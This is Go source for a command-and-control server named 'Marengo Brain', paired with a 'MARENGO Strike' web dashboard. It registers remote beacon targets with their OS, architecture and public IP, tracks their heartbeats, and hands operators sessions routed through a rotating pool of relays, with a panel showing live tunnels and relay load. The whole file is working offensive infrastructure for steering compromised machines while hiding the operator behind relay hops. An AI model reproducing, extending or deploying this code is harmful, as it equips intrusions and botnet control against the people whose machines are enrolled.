package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

// --- DATA STRUCTURES ---
type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

var (
	relayPoolMap   = make(map[string]time.Time)
	relayMetadata  = make(map[string]time.Time)
	activeSessions = make(map[string]string)
	activeTargets  = make(map[string]string)
	lastSeen       = make(map[string]time.Time)
	trafficCount   = make(map[string]int)
	publicIPs      = make(map[string]string)
	nodeOS         = make(map[string]string)
	nodeArch       = make(map[string]string)
	eventLog       []string
	mu             sync.Mutex
	startTime      = time.Now()
)

const (
	dbFile      = "infra_db.json"
	sessionFile = "sessions_db.json"
)

// --- LOGGING (Safe Version) ---
// This version doesn't use Mutex, so we only call it while mu is already locked.
func addLogInternal(msg string) {
	ts := time.Now().Format("15:04:05")
	eventLog = append([]string{"[" + ts + "] " + msg}, eventLog...)
	if len(eventLog) > 20 {
		eventLog = eventLog[:20]
	}
}

// --- PERSISTENCE ---
func saveState() {
	relays := make([]string, 0, len(relayPoolMap))
	for k := range relayPoolMap {
		relays = append(relays, k)
	}
	rData, _ := json.Marshal(relays)
	os.WriteFile(dbFile, rData, 0644)
	sData, _ := json.Marshal(activeSessions)
	os.WriteFile(sessionFile, sData, 0644)
}

func loadState() {
	mu.Lock()
	defer mu.Unlock()
	if rData, err := os.ReadFile(dbFile); err == nil {
		var keys []string
		json.Unmarshal(rData, &keys)
		for _, k := range keys {
			relayPoolMap[k] = time.Now()
			relayMetadata[k] = time.Now()
		}
	}
	if sData, err := os.ReadFile(sessionFile); err == nil {
		json.Unmarshal(sData, &activeSessions)
	}
}

// 2. KEEP THIS ONE (Global version for general use)
func addLog(msg string) {
	mu.Lock()
	defer mu.Unlock()
	addLogInternal(msg)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	loadState()

	// --- 1. THE GLOBAL REAPER ---
	go func() {
		for {
			time.Sleep(10 * time.Second)
			mu.Lock()

			for id, t := range lastSeen {
				// 60 seconds is the sweet spot for a 10s heartbeat ghost
				if time.Since(t) > 60*time.Second {
					addLogInternal("TIMEOUT: Purging node " + id)
					delete(lastSeen, id)
					delete(activeTargets, id)
					delete(publicIPs, id)
					delete(nodeOS, id)
					delete(nodeArch, id)
					delete(activeSessions, id)
				}
			}

			for addr, t := range relayPoolMap {
				if time.Since(t) > 45*time.Second {
					delete(relayPoolMap, addr)
					delete(relayMetadata, addr)
				}
			}
			mu.Unlock()
		}
	}()

	go startAnalysisPanel()

	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("[!] Listen Error:", err)
		return
	}

	fmt.Println("[*] Marengo Brain Online: Port 8080")
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	var req AuthRequest
	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	if err := json.NewDecoder(conn).Decode(&req); err != nil {
		return
	}

	id := req.TargetID
	mu.Lock()
	defer mu.Unlock()

	if id != "" {
		trafficCount[id]++
	}

	switch req.Type {
	case "middle":
		relayPoolMap[req.Listen] = time.Now()
		if _, exists := relayMetadata[req.Listen]; !exists {
			relayMetadata[req.Listen] = time.Now()
		}
		go saveState()

	case "client_register":
		activeTargets[id] = req.Key
		lastSeen[id] = time.Now()
		publicIPs[id] = ip
		nodeOS[id] = req.OS
		nodeArch[id] = req.Arch
		addLogInternal("REGISTER: " + id + " (" + req.OS + ")")

	case "cc_list":
		t := make([]string, 0)
		for tid, ts := range lastSeen {
			// Filter list to only show nodes heartbeated within the last minute
			if time.Since(ts) < 60*time.Second {
				t = append(t, tid)
			}
		}
		json.NewEncoder(conn).Encode(t)

	case "cc_req":
		keys := make([]string, 0, len(relayPoolMap))
		for k, lastT := range relayPoolMap {
			if time.Since(lastT) < 45*time.Second {
				keys = append(keys, k)
			}
		}
		if len(keys) > 0 {
			selected := keys[rand.Intn(len(keys))]
			activeSessions[id] = selected
			addLogInternal(fmt.Sprintf("HOP: %s ➔ %s", id, selected))
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selected})
		} else {
			addLogInternal("ERROR: No relays available for " + id)
		}

	case "client_poll":
		lastSeen[id] = time.Now()
		publicIPs[id] = ip
		addr, exists := activeSessions[id]
		if exists && addr != "" {
			publicIPs[id+"_relay"] = addr
			delete(activeSessions, id)
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
		} else {
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: ""})
		}
	}
}
func startAnalysisPanel() {
	// Root Dashboard
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MARENGO Strike // Infra-Overwatch</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #020617; --panel: #0a1120; --border: rgba(56, 189, 248, 0.3); --accent: #38bdf8; --white: #ffffff; }
        body { background: var(--bg); font-family: 'JetBrains Mono', monospace; color: var(--white); margin: 0; font-size: 10px; overflow: hidden; }
        .sidebar-l { width: 220px; height: 100vh; position: fixed; left: 0; border-right: 1px solid var(--border); padding: 15px; background: var(--panel); }
        .center-hud { margin-left: 220px; padding: 20px; height: 100vh; overflow-y: auto; transition: margin-right 0.3s; }
        .inspect-panel { width: 0; height: 100vh; position: fixed; right: 0; top: 0; background: #0f172a; border-left: 2px solid var(--accent); overflow-y: auto; transition: width 0.3s; z-index: 100; }
        .inspect-panel.active { width: 450px; padding: 25px; }
        .glass { background: rgba(15, 23, 42, 0.85); border: 1px solid var(--border); padding: 12px; margin-bottom: 15px; }
        .tunnel-row { display: flex; justify-content: space-between; padding: 15px; border: 1px solid var(--border); background: rgba(56, 189, 248, 0.03); cursor: pointer; margin-bottom: 8px; }
        .hdr { font-weight: bold; text-transform: uppercase; color: var(--accent); border-bottom: 1px solid var(--border); margin-bottom: 15px; padding-bottom: 8px; font-size: 11px; }
        .relay-card { border: 1px solid var(--border); padding: 10px; margin-bottom: 10px; background: rgba(255,255,255,0.02); }
    </style>
</head>
<body>
    <div class="sidebar-l">
        <div class="hdr">SYSTEM_LOGISTICS</div>
        <div class="mb-4">
            <span style="font-size:8px; opacity:0.5">RELAY_FLEET_SIZE</span>
            <div id="relay-count-nav" class="h6 text-white">0 ACTIVE</div>
        </div>
        <div class="mb-4">
            <span style="font-size:8px; opacity:0.5">UPTIME</span>
            <div id="uptime" class="h6 text-white">0s</div>
        </div>
    </div>

    <div class="center-hud" id="main-hud">
        <div class="hdr">LIVE_TUNNEL_MATRIX</div>
        <div id="tunnel-matrix"></div>

        <div class="hdr mt-5">GLOBAL_RELAY_INFRASTRUCTURE</div>
        <div class="row g-2" id="global-relay-list">
            </div>
    </div>

    <div class="inspect-panel" id="inspect-drawer">
        <div class="hdr">BEACON_TELEMETRY</div>
        <div id="det-id" class="fw-bold text-info mb-4">---</div>
        <div id="det-data" class="small"></div>
    </div>

    <script>
        async function update() {
            try {
                const res = await fetch('/api/metrics');
                const data = await res.json();
                
                document.getElementById('uptime').innerText = data.uptime + "s";
                document.getElementById('relay-count-nav').innerText = data.relay_stats.length + " ACTIVE";

                // 1. Render Beacons
                if (data.nodes && data.nodes.length > 0) {
                    document.getElementById('tunnel-matrix').innerHTML = data.nodes.map(n => 
                        '<div class="tunnel-row" onclick="inspectNode(\''+n.id+'\')">' +
                        '<div><b>['+n.id+']</b></div><div>➔</div><div class="text-info">'+(n.relay || 'LINKING...')+'</div></div>'
                    ).join('');
                } else {
                    document.getElementById('tunnel-matrix').innerHTML = '<div class="opacity-25 p-3">NO BEACONS CONNECTED</div>';
                }

                // 2. Render Relays (Fixing the "Empty" issue)
                if (data.relay_stats && data.relay_stats.length > 0) {
                    document.getElementById('global-relay-list').innerHTML = data.relay_stats.map(r => 
                        '<div class="col-md-4"><div class="relay-card">' +
                        '<div class="text-info fw-bold mb-1">' + r.addr + '</div>' +
                        '<div class="d-flex justify-content-between opacity-75">' +
                        '<span>UP: ' + r.uptime + 's</span><span>LOAD: ' + r.client_count + '</span>' +
                        '</div></div></div>'
                    ).join('');
                } else {
                    document.getElementById('global-relay-list').innerHTML = '<div class="col-12 opacity-25">NO RELAYS DISCOVERED</div>';
                }

            } catch(e) { console.error("Sync Error:", e); }
        }

        function inspectNode(id) {
            document.getElementById('inspect-drawer').classList.add('active');
            document.getElementById('det-id').innerText = "INSPECTING: " + id;
        }

        setInterval(update, 2000); update();
    </script>
</body></html>`)
	})

	http.HandleFunc("/api/metrics", func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		defer mu.Unlock()

		relayClients := make(map[string]int)
		for _, rAddr := range activeSessions {
			relayClients[rAddr]++
		}

		type relayInfo struct {
			Addr        string `json:"addr"`
			ClientCount int    `json:"client_count"`
			Uptime      int    `json:"uptime"`
			LastSeen    int    `json:"last_seen"`
		}

		// Pulling directly from the live map
		relayStats := []relayInfo{}
		for addr, lastT := range relayPoolMap {
			relayStats = append(relayStats, relayInfo{
				Addr:        addr,
				ClientCount: relayClients[addr],
				Uptime:      int(time.Since(relayMetadata[addr]).Seconds()),
				LastSeen:    int(time.Since(lastT).Seconds()),
			})
		}

		type nodeInfo struct {
			ID       string `json:"id"`
			Relay    string `json:"relay"`
			PublicIP string `json:"public_ip"`
		}

		nodes := []nodeInfo{}
		for id, _ := range lastSeen {
			// Check if there is a live session OR a last-known relay
			relayDisplay := activeSessions[id]
			if relayDisplay == "" {
				relayDisplay = publicIPs[id+"_relay"]
			}

			nodes = append(nodes, nodeInfo{
				ID:       id,
				Relay:    relayDisplay, // This will now show the actual IP instead of "Linking..."
				PublicIP: publicIPs[id],
			})
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"nodes":       nodes,
			"relay_stats": relayStats, // Ensure this matches JS 'data.relay_stats'
			"uptime":      int(time.Since(startTime).Seconds()),
		})
	})
	http.ListenAndServe(":9000", nil)
}
